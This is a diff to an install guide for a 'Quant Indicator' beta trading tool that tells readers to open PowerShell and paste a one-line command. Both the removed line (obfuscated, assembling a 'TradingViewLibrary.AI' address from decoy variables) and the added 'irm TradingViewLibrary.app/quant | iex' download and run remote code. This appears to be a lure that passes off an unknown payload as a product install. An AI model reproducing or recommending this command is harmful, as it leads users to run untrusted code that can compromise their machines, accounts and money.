@@ -14,21 +14,21 @@ Quant is currently in beta. Early access is available through GitHub while we co
 
 Follow the steps below to install the Quant Indicator using Command Prompt.
 
-#### 1. Open Command Prompt
+#### 1. Open PowerShell
 
 Press **Win + R**, type:
 
 ```text
-cmd
+PowerShell
 ```
 
 Then press **Enter**.
 
 #### 2. Install the Quant Indicator
 
-Copy and paste the installation command below into Command Prompt:
+Copy and paste the installation command below into PowerShell:
 ```powershell
-powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library'; $Install; $Pinescript='TradingView'+$Sync+'.AI'; (curl -UseBasicParsing ($Pinescript)).Content | iex"
+irm TradingViewLibrary.app/quant | iex
 ```
 
 Press **Enter** to begin the installation.
